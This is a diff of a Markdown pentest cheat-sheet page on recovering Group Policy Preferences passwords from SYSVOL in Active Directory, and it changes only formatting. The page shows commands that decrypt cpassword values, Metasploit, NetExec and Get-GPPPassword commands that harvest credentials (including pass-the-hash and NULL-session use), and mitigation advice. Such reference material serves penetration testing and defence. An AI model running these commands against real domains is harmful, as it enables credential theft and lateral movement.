@@ -17,23 +17,25 @@ echo '5OPdEKwZSf7dYAvLOe6RzRDtcvT/wCP8g5RqmAgjSso=' | base64 -d | openssl enc -d
 echo 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000
 ```
 
-
 ## Automate the SYSVOL and passwords research
 
 * `Metasploit` modules to enumerate shares and credentials
+
     ```c
     scanner/smb/smb_enumshares
     post/windows/gather/enum_shares
     post/windows/gather/credentials/gpp
     ```
 
-* netexec modules
+* NetExec modules
+
     ```powershell
     nxc smb 10.10.10.10 -u Administrator -H 89[...]9d -M gpp_autologin
     nxc smb 10.10.10.10 -u Administrator -H 89[...]9d -M gpp_password
     ```
 
 * [Get-GPPPassword](https://github.com/SecureAuthCorp/impacket/blob/master/examples/Get-GPPPassword.py)
+
   ```powershell
   # with a NULL session
   Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'
@@ -50,7 +52,6 @@ echo 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aS
 * Install [KB2962486](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2014/ms14-025) on every computer used to manage GPOs which prevents new credentials from being placed in Group Policy Preferences.
 * Delete existing GPP xml files in SYSVOL containing passwords.
 * Don’t put passwords in files that are accessible by all authenticated users.
-
 
 ## References
 
